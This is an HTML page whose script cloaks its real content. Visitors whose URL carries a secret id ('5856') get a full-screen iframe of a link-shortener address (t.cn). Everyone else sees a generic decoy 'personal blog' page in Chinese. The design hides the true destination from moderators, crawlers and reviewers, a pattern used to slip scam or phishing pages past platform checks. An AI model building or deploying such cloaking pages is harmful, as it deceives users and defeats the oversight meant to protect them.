<html>
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
<title>欢迎访问</title>
<body style="margin:0;padding:0;height:100%" scroll=no>

<script>
// 检查ID参数
function checkAccess() {
    const urlParams = new URLSearchParams(window.location.search);
    const id = urlParams.get('id');
    
    if (id === '5856') {
        // 显示原始页面
        document.body.innerHTML = `
            <iframe id="infrm" name="infrm" marginwidth="0" marginheight="0" width="100%" scrolling=auto src="http://t.cn" frameborder="0" height="100%" allowfullscreen="true"></iframe>
            
            <script>
                $(document).ready(function(){
                    function fix_height(){  
                        $("#infrm").attr("height", (($(window).height())-5) + "px");
                    }
                    $(window).resize(function(){ fix_height(); }).resize();
                    $("#infrm").contentWindow.focus();
                });
            <\/script>
        `;
    } else {
        // 显示个人博客页面
        document.body.innerHTML = `
            <div style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px;">
                <header style="text-align: center; margin-bottom: 40px;">
                    <h1 style="color: #333;">我的个人博客</h1>
                    <p style="color: #666;">分享技术与生活</p>
                </header>
                
                <main>
                    <article style="margin-bottom: 30px; padding: 20px; background: #f9f9f9; border-radius: 8px;">
                        <h2 style="color: #444;">欢迎来到我的博客</h2>
                        <p style="color: #555; line-height: 1.6;">这是一个简单的个人博客页面，用于分享我的学习心得和技术经验。</p>
                    </article>
                    
                    <article style="margin-bottom: 30px; padding: 20px; background: #f9f9f9; border-radius: 8px;">
                        <h2 style="color: #444;">关于我</h2>
                        <p style="color: #555; line-height: 1.6;">我是一名热爱编程的开发者，喜欢探索新技术，分享知识。</p>
                    </article>
                </main>
                
                <footer style="text-align: center; margin-top: 40px; padding: 20px; color: #888;">
                    <p>&copy; 2024 我的个人博客. 版权所有.</p>
                </footer>
            </div>
        `;
    }
}

// 页面加载时检查
window.onload = checkAccess;
</script>

</body>
</html>
